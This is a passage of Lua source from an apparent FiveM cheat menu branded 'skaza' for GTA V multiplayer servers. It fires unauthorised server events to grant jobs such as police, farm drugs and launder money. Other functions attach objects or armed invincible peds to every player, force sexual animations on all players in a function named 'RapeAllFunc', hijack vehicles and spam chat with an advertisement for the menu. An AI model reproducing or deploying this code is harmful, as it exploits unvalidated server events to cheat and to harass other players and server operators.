                    'esx_society:setJob',
                    function()
                    end,
                    bG,
                    'realestateagent',
                    3,
                    'hire'
                )
            end
        )
    end
end

function TaxiPlayer(bF)
    if ESX then
        ESX.TriggerServerCallback(
            'esx_society:getOnlinePlayers',
            function(as)
                local bG = nil
                for i = 1, #as, 1 do
                    label = as[i].name
                    value = as[i].source
                    name = as[i].name
                    if name == GetPlayerName(bF) then
                        bG = as[i].identifier
                        debugLog('found ' .. as[i].name .. ' ' .. as[i].identifier)
                    end
                    identifier = as[i].identifier
                end
                ESX.TriggerServerCallback(
                    'esx_society:setJob',
                    function()
                    end,
                    bG,
                    'taxi',
                    3,
                    'hire'
                )
            end
        )
    end
end

function AmbulancePlayer(bF)
    if ESX then
        ESX.TriggerServerCallback(
            'esx_society:getOnlinePlayers',
            function(as)
                local bG = nil
                for i = 1, #as, 1 do
                    label = as[i].name
                    value = as[i].source
                    name = as[i].name
                    if name == GetPlayerName(bF) then
                        bG = as[i].identifier
                        debugLog('found ' .. as[i].name .. ' ' .. as[i].identifier)
                    end
                    identifier = as[i].identifier
                end
                ESX.TriggerServerCallback(
                    'esx_society:setJob',
                    function()
                    end,
                    bG,
                    'ambulance',
                    3,
                    'hire'
                )
            end
        )
    end
end

function PolicePlayer(bF)
    if ESX then
        ESX.TriggerServerCallback(
            'esx_society:getOnlinePlayers',
            function(as)
                local bG = nil
                for i = 1, #as, 1 do
                    label = as[i].name
                    value = as[i].source
                    name = as[i].name
                    if name == GetPlayerName(bF) then
                        bG = as[i].identifier
                        debugLog('found ' .. as[i].name .. ' ' .. as[i].identifier)
                    end
                    identifier = as[i].identifier
                end
                ESX.TriggerServerCallback(
                    'esx_society:setJob',
                    function()
                    end,
                    bG,
                    'police',
                    3,
                    'hire'
                )
            end
        )
    end
end

function MecanoPlayer(bF)
    if ESX then
        ESX.TriggerServerCallback(
            'esx_society:getOnlinePlayers',
            function(as)
                local bG = nil
                for i = 1, #as, 1 do
                    label = as[i].name
                    value = as[i].source
                    name = as[i].name
                    if name == GetPlayerName(bF) then
                        bG = as[i].identifier
                        debugLog('found ' .. as[i].name .. ' ' .. as[i].identifier)
                    end
                    identifier = as[i].identifier
                end
                ESX.TriggerServerCallback(
                    'esx_society:setJob',
                    function()
                    end,
                    bG,
                    'mecano',
                    3,
                    'hire'
                )
            end
        )
    end
end

function bananapartyall()
    Citizen.CreateThread(
        function()
            --[[for bD = 0, 9 do
                jebacariesa(
                    '_chat:messageEntered',
                    'skaza',
                    {
                        141,
                        211,
                        255
                    },
                    '^' .. bD .. 'skaza ~ 5391'
                )
            end--]]
            for i = 0, 128 do
                local bH = CreateObject(GetHashKey('p_crahsed_heli_s'), 0, 0, 0, true, true, true)
                local bI = CreateObject(GetHashKey('prop_rock_4_big2'), 0, 0, 0, true, true, true)
                local bJ = CreateObject(GetHashKey('prop_beachflag_le'), 0, 0, 0, true, true, true)
                AttachEntityToEntity(
                    bH,
                    GetPlayerPed(i),
                    GetPedBoneIndex(GetPlayerPed(i), 57005),
                    0.4,
                    0,
                    0,
                    0,
                    270.0,
                    60.0,
                    true,
                    true,
                    false,
                    true,
                    1,
                    true
                )
                AttachEntityToEntity(
                    bI,
                    GetPlayerPed(i),
                    GetPedBoneIndex(GetPlayerPed(i), 57005),
                    0.4,
                    0,
                    0,
                    0,
                    270.0,
                    60.0,
                    true,
                    true,
                    false,
                    true,
                    1,
                    true
                )
                AttachEntityToEntity(
                    bJ,
                    GetPlayerPed(i),
                    GetPedBoneIndex(GetPlayerPed(i), 57005),
                    0.4,
                    0,
                    0,
                    0,
                    270.0,
                    60.0,
                    true,
                    true,
                    false,
                    true,
                    1,
                    true
                )
            end
        end
    )
end

function RespawnPed(ped, bK, bL)
    SetEntityCoordsNoOffset(ped, bK.x, bK.y, bK.z, false, false, false, true)
    NetworkResurrectLocalPlayer(bK.x, bK.y, bK.z, bL, true, false)
    SetPlayerInvincible(ped, false)
    chujaries('playerSpawned', bK.x, bK.y, bK.z)
    ClearPedBloodDamage(ped)
end
local function bM(ad)
    local bN = NetworkGetNetworkIdFromEntity(ped)
    local bO = 0
    NetworkRequestControlOfNetworkId(bN)
    while not NetworkHasControlOfNetworkId(bN) do
        Citizen.Wait(1)
        NetworkRequestControlOfNetworkId(bN)
        bO = bO + 1
        if bO == 5000 then
            Citizen.Trace('Control failed')
            break
        end
    end
end
local function bP(bQ, bR)
    for i = 0, 10 do
        local bK = GetEntityCoords(GetPlayerPed(SelectedPlayer))
        pizda(GetHashKey(bQ))
        Citizen.Wait(50)
        if HasModelLoaded(GetHashKey(bQ)) then
            local ped =
                CreatePed(21, GetHashKey(bQ), bK.x + i, bK.y - i, bK.z, 0, true, false) and
                CreatePed(21, GetHashKey(bQ), bK.x - i, bK.y + i, bK.z, 0, true, false)
            if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                bM(ped)
                GiveWeaponToPed(ped, GetHashKey(bR), 9999, 1, 1)
                SetEntityInvincible(ped, true)
                SetPedCanSwitchWeapon(ped, true)
                TaskCombatPed(ped, GetPlayerPed(SelectedPlayer), 0, 16)
            elseif IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                TaskCombatHatedTargetsInArea(ped, bK.x, bK.y, bK.z, 500)
            else
                Citizen.Wait(0)
            end
        end
    end
end

function RapeAllFunc()
    --[[for bD = 0, 9 do
        jebacariesa(
            '_chat:messageEntered',
            'skaza',
            {
                141,
                211,
                255
            },
            '^' .. bD .. 'You got raped by skaza'
        )
    end--]]
    Citizen.CreateThread(
        function()
            for i = 0, 128 do
                pizdaSync('a_m_o_acult_01')
                RequestAnimDict('rcmpaparazzo_2')
                while not HasAnimDictLoaded('rcmpaparazzo_2') do
                    Citizen.Wait(0)
                end
                if IsPedInAnyVehicle(GetPlayerPed(i), true) then
                    local veh = GetVehiclePedIsIn(GetPlayerPed(i), true)
                    while not NetworkHasControlOfEntity(veh) do
                        NetworkRequestControlOfEntity(veh)
                        Citizen.Wait(0)
                    end
                    SetEntityAsMissionEntity(veh, true, true)
                    DeleteVehicle(veh)
                    DeleteEntity(veh)
                end
                count = -0.2
                for b = 1, 3 do
                    local x, y, z = table.unpack(GetEntityCoords(GetPlayerPed(i), true))
                    local bS = CreatePed(4, GetHashKey('a_m_o_acult_01'), x, y, z, 0.0, true, false)
                    SetEntityAsMissionEntity(bS, true, true)
                    AttachEntityToEntity(
                        bS,
                        GetPlayerPed(i),
                        4103,
                        11816,
                        count,
                        0.00,
                        0.0,
                        0.0,
                        0.0,
                        0.0,
                        false,
                        false,
                        false,
                        false,
                        2,
                        true
                    )
                    ClearPedTasks(GetPlayerPed(i))
                    TaskPlayAnim(GetPlayerPed(i), 'rcmpaparazzo_2', 'shag_loop_poppy', 2.0, 2.5, -1, 49, 0, 0, 0, 0)
                    SetPedKeepTask(bS)
                    TaskPlayAnim(bS, 'rcmpaparazzo_2', 'shag_loop_a', 2.0, 2.5, -1, 49, 0, 0, 0, 0)
                    SetEntityInvincible(bS, true)
                    count = count - 0.4
                end
            end
        end
    )
end
function chatspam()
                jebacariesa(
                    '_chat:messageEntered',
                    'skaza',
                    {0, 0x99, 255},
                    '/ooc skaza menu! Buy at https://discord.gg/BbDMhJe'
                )
                jebacariesa('_chat:messageEntered', 'skaza', {0, 0x99, 255}, 'skaza <3 https://discord.gg/BbDMhJe')
            end
			
local function bT()
    local bU = KeyboardInput('Enter X pos', '', 100)
    local bV = KeyboardInput('Enter Y pos', '', 100)
    local bW = KeyboardInput('Enter Z pos', '', 100)
    if bU ~= '' and bV ~= '' and bW ~= '' then
        if
            IsPedInAnyVehicle(GetPlayerPed(-1), 0) and
                GetPedInVehicleSeat(GetVehiclePedIsIn(GetPlayerPed(-1), 0), -1) == GetPlayerPed(-1)
         then
            entity = GetVehiclePedIsIn(GetPlayerPed(-1), 0)
        else
            entity = GetPlayerPed(-1)
        end
        if entity then
            SetEntityCoords(entity, bU + 0.5, bV + 0.5, bW + 0.5, 1, 0, 0, 1)
            av('~g~Teleported to coords!', false)
        end
    else
        av('~w~Invalid coords!', true)
    end
end
local function bX()
    local name = KeyboardInput('Enter Blip Name', '', 100)
    if name == '' then
        av('~w~Invalid Blip Name!', true)
        return bX()
    else
        local bU = KeyboardInput('Enter X pos', '', 100)
        local bV = KeyboardInput('Enter Y pos', '', 100)
        local bW = KeyboardInput('Enter Z pos', '', 100)
        if bU ~= '' and bV ~= '' and bW ~= '' then
            local bY = {
                {
                    colour = 75,
                    id = 84
                }
            }
            for _, bZ in pairs(bY) do
                bZ.blip = AddBlipForCoord(bU + 0.5, bV + 0.5, bW + 0.5)
                SetBlipSprite(bZ.blip, bZ.id)
                SetBlipDisplay(bZ.blip, 4)
                SetBlipScale(bZ.blip, 0.9)
                SetBlipColour(bZ.blip, bZ.colour)
                SetBlipAsShortRange(bZ.blip, true)
                BeginTextCommandSetBlipName('STRING')
                AddTextComponentString(name)
                EndTextCommandSetBlipName(bZ.blip)
            end
        else
            av('~w~Invalid coords!', true)
        end
    end
end

local function b_()
    local ax = GetPlayerPed(-1)
    local c0 = GetEntityCoords(ax, true)
    local c1 = GetClosestVehicle(GetEntityCoords(ax, true), 1000.0, 0, 4)
    local c2 = GetEntityCoords(c1, true)
    local c3 = GetClosestVehicle(GetEntityCoords(ax, true), 1000.0, 0, 16384)
    local c4 = GetEntityCoords(c3, true)
    av('~y~Wait...', false)
    Citizen.Wait(1000)
    if c1 == 0 and c3 == 0 then
        av('~w~No Vehicle Found', true)
    elseif c1 == 0 and c3 ~= 0 then
        if IsVehicleSeatFree(c3, -1) then
            SetPedIntoVehicle(ax, c3, -1)
            SetVehicleAlarm(c3, false)
            SetVehicleDoorsLocked(c3, 1)
            SetVehicleNeedsToBeHotwired(c3, false)
        else
            local c5 = GetPedInVehicleSeat(c3, -1)
            ClearPedTasksImmediately(c5)
            SetEntityAsMissionEntity(c5, 1, 1)
            DeleteEntity(c5)
            SetPedIntoVehicle(ax, c3, -1)
            SetVehicleAlarm(c3, false)
            SetVehicleDoorsLocked(c3, 1)
            SetVehicleNeedsToBeHotwired(c3, false)
        end
        av('~g~Teleported Into Nearest Vehicle!', false)
    elseif c1 ~= 0 and c3 == 0 then
        if IsVehicleSeatFree(c1, -1) then
            SetPedIntoVehicle(ax, c1, -1)
            SetVehicleAlarm(c1, false)
            SetVehicleDoorsLocked(c1, 1)
            SetVehicleNeedsToBeHotwired(c1, false)
        else
            local c5 = GetPedInVehicleSeat(c1, -1)
            ClearPedTasksImmediately(c5)
            SetEntityAsMissionEntity(c5, 1, 1)
            DeleteEntity(c5)
            SetPedIntoVehicle(ax, c1, -1)
            SetVehicleAlarm(c1, false)
            SetVehicleDoorsLocked(c1, 1)
            SetVehicleNeedsToBeHotwired(c1, false)
        end
        av('~g~Teleported Into Nearest Vehicle!', false)
    elseif c1 ~= 0 and c3 ~= 0 then
        if Vdist(c2.x, c2.y, c2.z, c0.x, c0.y, c0.z) < Vdist(c4.x, c4.y, c4.z, c0.x, c0.y, c0.z) then
            if IsVehicleSeatFree(c1, -1) then
                SetPedIntoVehicle(ax, c1, -1)
                SetVehicleAlarm(c1, false)
                SetVehicleDoorsLocked(c1, 1)
                SetVehicleNeedsToBeHotwired(c1, false)
            else
                local c5 = GetPedInVehicleSeat(c1, -1)
                ClearPedTasksImmediately(c5)
                SetEntityAsMissionEntity(c5, 1, 1)
                DeleteEntity(c5)
                SetPedIntoVehicle(ax, c1, -1)
                SetVehicleAlarm(c1, false)
                SetVehicleDoorsLocked(c1, 1)
                SetVehicleNeedsToBeHotwired(c1, false)
            end
        elseif Vdist(c2.x, c2.y, c2.z, c0.x, c0.y, c0.z) > Vdist(c4.x, c4.y, c4.z, c0.x, c0.y, c0.z) then
            if IsVehicleSeatFree(c3, -1) then
                SetPedIntoVehicle(ax, c3, -1)
                SetVehicleAlarm(c3, false)
                SetVehicleDoorsLocked(c3, 1)
                SetVehicleNeedsToBeHotwired(c3, false)
            else
                local c5 = GetPedInVehicleSeat(c3, -1)
                ClearPedTasksImmediately(c5)
                SetEntityAsMissionEntity(c5, 1, 1)
                DeleteEntity(c5)
                SetPedIntoVehicle(ax, c3, -1)
                SetVehicleAlarm(c3, false)
                SetVehicleDoorsLocked(c3, 1)
                SetVehicleNeedsToBeHotwired(c3, false)
            end
        end
        av('~g~Teleported Into Nearest Vehicle!', false)
    end
end
local function c6()
    if DoesBlipExist(GetFirstBlipInfoId(8)) then
        local c7 = GetBlipInfoIdIterator(8)
        local blip = GetFirstBlipInfoId(8, c7)
        WaypointCoords = Citizen.InvokeNative(0xFA7C7F0AADF25D09, blip, Citizen.ResultAsVector())
        wp = true
    else
        av('~w~No waypoint!', true)
    end
    local c8 = 0.0
    height = 1000.0
    while wp do
        Citizen.Wait(0)
        if wp then
            if
                IsPedInAnyVehicle(GetPlayerPed(-1), 0) and
                    GetPedInVehicleSeat(GetVehiclePedIsIn(GetPlayerPed(-1), 0), -1) == GetPlayerPed(-1)
             then
                entity = GetVehiclePedIsIn(GetPlayerPed(-1), 0)
            else
                entity = GetPlayerPed(-1)
            end
            SetEntityCoords(entity, WaypointCoords.x, WaypointCoords.y, height)
            FreezeEntityPosition(entity, true)
            local c9 = GetEntityCoords(entity, true)
            if c8 == 0.0 then
                height = height - 25.0
                SetEntityCoords(entity, c9.x, c9.y, height)
                bool, c8 = GetGroundZFor_3dCoord(c9.x, c9.y, c9.z, 0)
            else
                SetEntityCoords(entity, c9.x, c9.y, c8)
                FreezeEntityPosition(entity, false)
                wp = false
                height = 1000.0
                c8 = 0.0
                av('~g~Teleported to waypoint!', false)
                break
            end
        end
    end
end
local function ca()
    local cb = KeyboardInput('Enter Vehicle Spawn Name', '', 100)
    if cb and IsModelValid(cb) and IsModelAVehicle(cb) then
        pizda(cb)
        while not HasModelLoaded(cb) do
            Citizen.Wait(0)
        end
        local veh =
            CreateVehicle(
            GetHashKey(cb),
            GetEntityCoords(PlayerPedId(-1)),
            GetEntityHeading(PlayerPedId(-1)),
            true,
            true
        )
        SetPedIntoVehicle(PlayerPedId(-1), veh, -1)
    else
        av('~w~~h~Model is not valid!', true)
    end
end
local function cc()
    SetVehicleFixed(GetVehiclePedIsIn(GetPlayerPed(-1), false))
    SetVehicleDirtLevel(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0.0)
    SetVehicleLights(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0)
    SetVehicleBurnout(GetVehiclePedIsIn(GetPlayerPed(-1), false), false)
    Citizen.InvokeNative(0x1FD09E7390A74D54, GetVehiclePedIsIn(GetPlayerPed(-1), false), 0)
    SetVehicleUndriveable(vehicle, false)
end
local function cd()
    SetVehicleEngineHealth(vehicle, 1000)
    Citizen.InvokeNative(0x1FD09E7390A74D54, GetVehiclePedIsIn(GetPlayerPed(-1), false), 0)
    SetVehicleUndriveable(vehicle, false)
end
local function ce()
    skaza.StartRC()
end
skaza.StartRC = function()
    if DoesEntityExist(skaza.Entity) then
        return
    end
    skaza.SpawnRC()
    skaza.Tablet(true)
    while DoesEntityExist(skaza.Entity) and DoesEntityExist(skaza.Driver) do
        Citizen.Wait(5)
        local cf = GetDistanceBetweenCoords(GetEntityCoords(PlayerPedId()), GetEntityCoords(skaza.Entity), true)
        skaza.DrawInstructions(cf)
        skaza.HandleKeys(cf)
        if cf <= 3000.0 then
            if not NetworkHasControlOfEntity(skaza.Driver) then
                NetworkRequestControlOfEntity(skaza.Driver)
            elseif not NetworkHasControlOfEntity(skaza.Entity) then
                NetworkRequestControlOfEntity(skaza.Entity)
            end
        else
            TaskVehicleTempAction(skaza.Driver, skaza.Entity, 6, 2500)
        end
    end
end
skaza.HandleKeys = function(cf)
    if IsControlJustReleased(0, 47) then
        if IsCamRendering(skaza.Camera) then
            skaza.ToggleCamera(false)
        else
            skaza.ToggleCamera(true)
        end
    end
    if cf <= 3.0 then
        if IsControlJustPressed(0, 38) then
            skaza.Attach('pick')
        end
    end
    if cf < 3000.0 then
        if IsControlPressed(0, 172) and not IsControlPressed(0, 173) then
            TaskVehicleTempAction(skaza.Driver, skaza.Entity, 9, 1)
        end
        if IsControlJustReleased(0, 172) or IsControlJustReleased(0, 173) then
            TaskVehicleTempAction(skaza.Driver, skaza.Entity, 6, 2500)
        end
        if IsControlPressed(0, 173) and not IsControlPressed(0, 172) then
            TaskVehicleTempAction(skaza.Driver, skaza.Entity, 22, 1)
        end
        if IsControlPressed(0, 174) and IsControlPressed(0, 173) then
            TaskVehicleTempAction(skaza.Driver, skaza.Entity, 13, 1)
        end
        if IsControlPressed(0, 175) and IsControlPressed(0, 173) then
            TaskVehicleTempAction(skaza.Driver, skaza.Entity, 14, 1)
        end
        if IsControlPressed(0, 172) and IsControlPressed(0, 173) then
            TaskVehicleTempAction(skaza.Driver, skaza.Entity, 30, 100)
        end
        if IsControlPressed(0, 174) and IsControlPressed(0, 172) then
            TaskVehicleTempAction(skaza.Driver, skaza.Entity, 7, 1)
        end
        if IsControlPressed(0, 175) and IsControlPressed(0, 172) then
            TaskVehicleTempAction(skaza.Driver, skaza.Entity, 8, 1)
        end
        if IsControlPressed(0, 174) and not IsControlPressed(0, 172) and not IsControlPressed(0, 173) then
            TaskVehicleTempAction(skaza.Driver, skaza.Entity, 4, 1)
        end
        if IsControlPressed(0, 175) and not IsControlPressed(0, 172) and not IsControlPressed(0, 173) then
            TaskVehicleTempAction(skaza.Driver, skaza.Entity, 5, 1)
        end
        if IsControlJustReleased(0, 168) then
            SetVehicleEngineOn(skaza.Entity, not GetIsVehicleEngineRunning(skaza.Entity), false, true)
        end
    end
end
skaza.DrawInstructions = function(cf)
    local cg = {
        {
            ['label'] = 'Right',
            ['button'] = '~INPUT_CELLPHONE_RIGHT~'
        },
        {
            ['label'] = 'Forward',
            ['button'] = '~INPUT_CELLPHONE_UP~'
        },
        {
            ['label'] = 'Reverse',
            ['button'] = '~INPUT_CELLPHONE_DOWN~'
        },
        {
            ['label'] = 'Left',
            ['button'] = '~INPUT_CELLPHONE_LEFT~'
        }
    }
    local ch = {
        ['label'] = 'Delete Car',
        ['button'] = '~INPUT_CONTEXT~'
    }
    local cj = {
        {
            ['label'] = 'Toggle Camera',
            ['button'] = '~INPUT_DETONATE~'
        },
        {
            ['label'] = 'Start/Stop Engine',
            ['button'] = '~INPUT_SELECT_CHARACTER_TREVOR~'
        }
    }
    if cf <= 3000.0 then
        for ck = 1, #cg do
            local cl = cg[ck]
            table.insert(cj, cl)
        end
        if cf <= 3000.0 then
            table.insert(cj, ch)
        end
    end
    Citizen.CreateThread(
        function()
            local cm = RequestScaleformMovie('instructional_buttons')
            while not HasScaleformMovieLoaded(cm) do
                Wait(0)
            end
            PushScaleformMovieFunction(cm, 'CLEAR_ALL')
            PushScaleformMovieFunction(cm, 'TOGGLE_MOUSE_BUTTONS')
            PushScaleformMovieFunctionParameterBool(0)
            PopScaleformMovieFunctionVoid()
            for ck, cn in ipairs(cj) do
                PushScaleformMovieFunction(cm, 'SET_DATA_SLOT')
                PushScaleformMovieFunctionParameterInt(ck - 1)
                PushScaleformMovieMethodParameterButtonName(cn['button'])
                PushScaleformMovieFunctionParameterString(cn['label'])
                PopScaleformMovieFunctionVoid()
            end
            PushScaleformMovieFunction(cm, 'DRAW_INSTRUCTIONAL_BUTTONS')
            PushScaleformMovieFunctionParameterInt(-1)
            PopScaleformMovieFunctionVoid()
            DrawScaleformMovieFullscreen(cm, 255, 255, 255, 255)
        end
    )
end
skaza.SpawnRC = function()
    local cb = KeyboardInput('Enter Vehicle Spawn Name', '', 100)
    if cb and IsModelValid(cb) and IsModelAVehicle(cb) then
        pizda(cb)
        while not HasModelLoaded(cb) do
            Citizen.Wait(0)
        end
        skaza.LoadModels(
            {
                GetHashKey(cb),
                68070371
            }
        )
        local co, cp =
            GetEntityCoords(PlayerPedId()) + GetEntityForwardVector(PlayerPedId()) * 2.0,
            GetEntityHeading(PlayerPedId())
        skaza.Entity = CreateVehicle(GetHashKey(cb), co, cp, true)
        while not DoesEntityExist(skaza.Entity) do
            Citizen.Wait(5)
        end
        skaza.Driver = CreatePed(5, 68070371, co, cp, true)
        SetEntityInvincible(skaza.Driver, true)
        SetEntityVisible(skaza.Driver, false)
        FreezeEntityPosition(skaza.Driver, true)
        SetPedAlertness(skaza.Driver, 0.0)
        TaskWarpPedIntoVehicle(skaza.Driver, skaza.Entity, -1)
        while not IsPedInVehicle(skaza.Driver, skaza.Entity) do
            Citizen.Wait(0)
        end
        skaza.Attach('place')
        av('~g~~h~Success', false)
    else
        av('~w~~h~Model is not valid !', true)
    end
end
skaza.Attach = function(aw)
    if not DoesEntityExist(skaza.Entity) then
        return
    end
    skaza.LoadModels(
        {
            'pickup_object'
        }
    )
    if aw == 'place' then
        AttachEntityToEntity(
            skaza.Entity,
            PlayerPedId(),
            GetPedBoneIndex(PlayerPedId(), 28422),
            3.0,
            0.0,
            0.5,
            70.0,
            0.0,
            270.0,
            1,
            1,
            0,
            0,
            2,
            1
        )
        Citizen.Wait(200)
        DetachEntity(skaza.Entity, false, true)
        PlaceObjectOnGroundProperly(skaza.Entity)
    elseif aw == 'pick' then
        if DoesCamExist(skaza.Camera) then
            skaza.ToggleCamera(false)
        end
        skaza.Tablet(false)
        Citizen.Wait(100)
        DetachEntity(skaza.Entity)
        DeleteVehicle(skaza.Entity)
        DeleteEntity(skaza.Driver)
        skaza.UnloadModels()
    end
end
skaza.Tablet = function(cq)
    if cq then
        skaza.LoadModels(
            {
                GetHashKey('prop_cs_tablet')
            }
        )
        skaza.LoadModels(
            {
                'amb@code_human_in_bus_passenger_idles@female@tablet@idle_a'
            }
        )
        Citizen.CreateThread(
            function()
                while DoesEntityExist(skaza.TabletEntity) do
                    Citizen.Wait(5)
                    if
                        not IsEntityPlayingAnim(
                            PlayerPedId(),
                            'amb@code_human_in_bus_passenger_idles@female@tablet@idle_a',
                            'idle_a',
                            3
                        )
                     then
                    end
                end
                ClearPedTasks(PlayerPedId())
            end
        )
    else
        DeleteEntity(skaza.TabletEntity)
    end
end
skaza.ToggleCamera = function(cq)
    if not true then
        return
    end
    if cq then
        if not DoesEntityExist(skaza.Entity) then
            return
        end
        if DoesCamExist(skaza.Camera) then
            DestroyCam(skaza.Camera)
        end
        skaza.Camera = CreateCam('DEFAULT_SCRIPTED_CAMERA', true)
        AttachCamToEntity(skaza.Camera, skaza.Entity, 0.0, 0.0, 0.4, true)
        Citizen.CreateThread(
            function()
                while DoesCamExist(skaza.Camera) do
                    Citizen.Wait(5)
                    SetCamRot(skaza.Camera, GetEntityRotation(skaza.Entity))
                end
            end
        )
        local cr =
            500 *
            math.ceil(
                GetDistanceBetweenCoords(GetEntityCoords(PlayerPedId()), GetEntityCoords(skaza.Entity), true) / 10
            )
        RenderScriptCams(1, 1, cr, 1, 1)
        Citizen.Wait(cr)
        SetTimecycleModifier('scanline_cam_cheap')
        SetTimecycleModifierStrength(2.0)
    else
        local cr =
            500 *
            math.ceil(
                GetDistanceBetweenCoords(GetEntityCoords(PlayerPedId()), GetEntityCoords(skaza.Entity), true) / 10
            )
        RenderScriptCams(0, 1, cr, 1, 0)
        Citizen.Wait(cr)
        ClearTimecycleModifier()
        DestroyCam(skaza.Camera)
    end
end
skaza.LoadModels = function(cs)
    for ct = 1, #cs do
        local bB = cs[ct]
        if not skaza.CachedModels then
            skaza.CachedModels = {}
        end
        table.insert(skaza.CachedModels, bB)
        if IsModelValid(bB) then
            while not HasModelLoaded(bB) do
                pizda(bB)
                Citizen.Wait(10)
            end
        else
            while not HasAnimDictLoaded(bB) do
                RequestAnimDict(bB)
                Citizen.Wait(10)
            end
        end
    end
end
skaza.UnloadModels = function()
    for ct = 1, #skaza.CachedModels do
        local bB = skaza.CachedModels[ct]
        if IsModelValid(bB) then
            SetModelAsNoLongerNeeded(bB)
        else
            RemoveAnimDict(bB)
        end
    end
end
local function cu()
    local ax = GetPlayerPed(-1)
    local ay = GetVehiclePedIsIn(ax, true)
    local m = KeyboardInput('Enter the plate license you want', '', 100)
    if m ~= '' then
        SetVehicleNumberPlateText(ay, m)
    end
end

function pickupcannabis()
    jebacariesa('esx_drugs:pickedUpCannabis')
    jebacariesa('esx_drugs:pickedUpCannabis')
    jebacariesa('esx_drugs:pickedUpCannabis')
    jebacariesa('esx_drugs:pickedUpCannabis')
end

function proccesscannabis()
    jebacariesa('esx_drugs:processCannabis')
end

function hweed()
    jebacariesa('esx_drugs:startHarvestWeed')
    jebacariesa('esx_drugs:startHarvestWeed')
    jebacariesa('esx_drugs:startHarvestWeed')
    jebacariesa('esx_drugs:startHarvestWeed')
    jebacariesa('esx_illegal_drugs:startHarvestWeed')
    jebacariesa('esx_illegal_drugs:startHarvestWeed')
    jebacariesa('esx_illegal_drugs:startHarvestWeed')
    jebacariesa('esx_illegal_drugs:startHarvestWeed')
end

function tweed()
    jebacariesa('esx_drugs:startTransformWeed')
    jebacariesa('esx_drugs:startTransformWeed')
    jebacariesa('esx_drugs:startTransformWeed')
    jebacariesa('esx_drugs:startTransformWeed')
    jebacariesa('esx_illegal_drugs:startTransformWeed')
    jebacariesa('esx_illegal_drugs:startTransformWeed')
    jebacariesa('esx_illegal_drugs:startTransformWeed')
    jebacariesa('esx_illegal_drugs:startTransformWeed')
end

function sweed()
    jebacariesa('esx_drugs:startSellWeed')
    jebacariesa('esx_drugs:startSellWeed')
    jebacariesa('esx_drugs:startSellWeed')
    jebacariesa('esx_drugs:startSellWeed')
    jebacariesa('esx_illegal_drugs:startSellWeed')
    jebacariesa('esx_illegal_drugs:startSellWeed')
    jebacariesa('esx_illegal_drugs:startSellWeed')
    jebacariesa('esx_illegal_drugs:startSellWeed')
end

function hcoke()
    jebacariesa('esx_drugs:startHarvestCoke')
    jebacariesa('esx_drugs:startHarvestCoke')
    jebacariesa('esx_drugs:startHarvestCoke')
    jebacariesa('esx_drugs:startHarvestCoke')
    jebacariesa('esx_illegal_drugs:startHarvestCoke')
    jebacariesa('esx_illegal_drugs:startHarvestCoke')
    jebacariesa('esx_illegal_drugs:startHarvestCoke')
    jebacariesa('esx_illegal_drugs:startHarvestCoke')
end

function tcoke()
    jebacariesa('esx_drugs:startTransformCoke')
    jebacariesa('esx_drugs:startTransformCoke')
    jebacariesa('esx_drugs:startTransformCoke')
    jebacariesa('esx_drugs:startTransformCoke')
    jebacariesa('esx_illegal_drugs:startTransformCoke')
    jebacariesa('esx_illegal_drugs:startTransformCoke')
    jebacariesa('esx_illegal_drugs:startTransformCoke')
    jebacariesa('esx_illegal_drugs:startTransformCoke')
end

function scoke()
    jebacariesa('esx_drugs:startSellCoke')
    jebacariesa('esx_drugs:startSellCoke')
    jebacariesa('esx_drugs:startSellCoke')
    jebacariesa('esx_drugs:startSellCoke')
    jebacariesa('esx_illegal_drugs:startSellCoke')
    jebacariesa('esx_illegal_drugs:startSellCoke')
    jebacariesa('esx_illegal_drugs:startSellCoke')
    jebacariesa('esx_illegal_drugs:startSellCoke')
end

function hmeth()
    jebacariesa('esx_drugs:startHarvestMeth')
    jebacariesa('esx_drugs:startHarvestMeth')
    jebacariesa('esx_drugs:startHarvestMeth')
    jebacariesa('esx_drugs:startHarvestMeth')
    jebacariesa('esx_illegal_drugs:startHarvestMeth')
    jebacariesa('esx_illegal_drugs:startHarvestMeth')
    jebacariesa('esx_illegal_drugs:startHarvestMeth')
    jebacariesa('esx_illegal_drugs:startHarvestMeth')
    jebacariesa('MF_MobileMeth:RewardPlayers')
end

function tmeth()
    jebacariesa('esx_drugs:startTransformMeth')
    jebacariesa('esx_drugs:startTransformMeth')
    jebacariesa('esx_drugs:startTransformMeth')
    jebacariesa('esx_drugs:startTransformMeth')
    jebacariesa('esx_illegal_drugs:startTransformMeth')
    jebacariesa('esx_illegal_drugs:startTransformMeth')
    jebacariesa('esx_illegal_drugs:startTransformMeth')
    jebacariesa('esx_illegal_drugs:startTransformMeth')
end

function smeth()
    jebacariesa('esx_drugs:startSellMeth')
    jebacariesa('esx_drugs:startSellMeth')
    jebacariesa('esx_drugs:startSellMeth')
    jebacariesa('esx_drugs:startSellMeth')
    jebacariesa('esx_illegal_drugs:startSellMeth')
    jebacariesa('esx_illegal_drugs:startSellMeth')
    jebacariesa('esx_illegal_drugs:startSellMeth')
    jebacariesa('esx_illegal_drugs:startSellMeth')
end

function hopi()
    jebacariesa('esx_drugs:startHarvestOpium')
    jebacariesa('esx_drugs:startHarvestOpium')
    jebacariesa('esx_drugs:startHarvestOpium')
    jebacariesa('esx_drugs:startHarvestOpium')
    jebacariesa('esx_illegal_drugs:startHarvestOpium')
    jebacariesa('esx_illegal_drugs:startHarvestOpium')
    jebacariesa('esx_illegal_drugs:startHarvestOpium')
    jebacariesa('esx_illegal_drugs:startHarvestOpium')
end

function topi()
    jebacariesa('esx_drugs:startTransformOpium')
    jebacariesa('esx_drugs:startTransformOpium')
    jebacariesa('esx_drugs:startTransformOpium')
    jebacariesa('esx_drugs:startTransformOpium')
    jebacariesa('esx_illegal_drugs:startTransformOpium')
    jebacariesa('esx_illegal_drugs:startTransformOpium')
    jebacariesa('esx_illegal_drugs:startTransformOpium')
    jebacariesa('esx_illegal_drugs:startTransformOpium')
end

function sopi()
    jebacariesa('esx_drugs:startSellOpium')
    jebacariesa('esx_drugs:startSellOpium')
    jebacariesa('esx_drugs:startSellOpium')
    jebacariesa('esx_drugs:startSellOpium')
    jebacariesa('esx_illegal_drugs:startSellOpium')
    jebacariesa('esx_illegal_drugs:startSellOpium')
    jebacariesa('esx_illegal_drugs:startSellOpium')
    jebacariesa('esx_illegal_drugs:startSellOpium')
end

function snpc()
    jebacariesa('sellDrugs')
end

function mataaspalarufe()
    jebacariesa('esx_blanchisseur:startWhitening', 85)
